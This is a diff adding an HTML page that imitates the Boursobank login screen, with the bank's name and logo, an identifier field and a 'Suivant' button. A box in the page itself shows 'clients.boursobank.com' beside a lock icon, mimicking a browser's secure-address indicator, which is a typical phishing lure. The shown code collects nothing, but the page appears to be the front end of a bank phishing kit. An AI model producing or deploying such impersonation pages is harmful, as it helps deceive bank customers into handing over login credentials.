@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire - Boursobank</title>
+    <style>
+        /* Corps général */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Conteneur */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* Formulaire */
+        .form-box {
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        /* Bande rose avec le logo */
+        .header {
+            background: #ff006f;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            padding: 15px 0;
+        }
+
+        .header img {
+            max-height: 30px;
+        }
+
+        /* Titre */
+        h1 {
+            font-size: 1.5rem;
+            color: #333;
+            margin: 20px 0 10px;
+        }
+
+        /* Vérification de l'adresse */
+        .verification-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f1f9f1;
+            border: 1px solid #b7e4b7;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 20px;
+            color: #27ae60;
+            font-size: 0.9rem;
+        }
+
+        .verification-box img {
+            margin-right: 8px;
+            max-height: 20px;
+        }
+
+        /* Champ d'entrée */
+        .input-field {
+            width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .input-field::placeholder {
+            color: #bbb;
+        }
+
+        /* Cases à cocher et texte */
+        .remember-box {
+            display: flex;
+            align-items: center;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        .remember-box input {
+            margin-right: 5px;
+        }
+
+        /* Bouton */
+        .btn {
+            background: #ff006f;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #e60063;
+        }
+
+        /* Liens sous le bouton */
+        .forgot-link {
+            display: block;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: #ff006f;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+
+        .footer-links a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Bande rose avec logo -->
+        <div class="header">
+            <img src="logo-boursobank.png" alt="Logo Boursobank">
+        </div>
+
+        <!-- Formulaire principal -->
+        <div class="form-box">
+            <h1>Mon identifiant</h1>
+
+            <!-- Vérification d'adresse -->
+            <div class="verification-box">
+                <img src="lock-icon.png" alt="Icone Sécurité">
+                <span>clients.boursobank.com</span>
+            </div>
+
+            <!-- Champ d'identifiant -->
+            <input 
+                type="text" 
+                class="input-field" 
+                placeholder="Identifiant" 
+                maxlength="19">
+            
+            <!-- Mémorisation -->
+            <div class="remember-box">
+                <input type="checkbox" id="remember">
+                <label for="remember">Mémoriser mon identifiant</label>
+            </div>
+
+            <!-- Bouton -->
+            <button class="btn">Suivant</button>
+            <a href="#" class="forgot-link">Identifiant oublié ?</a>
+        </div>
+
+        <!-- Liens de bas de page -->
+        <div class="footer-links">
+            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
+        </div>
+    </div>
+</body>
+</html>
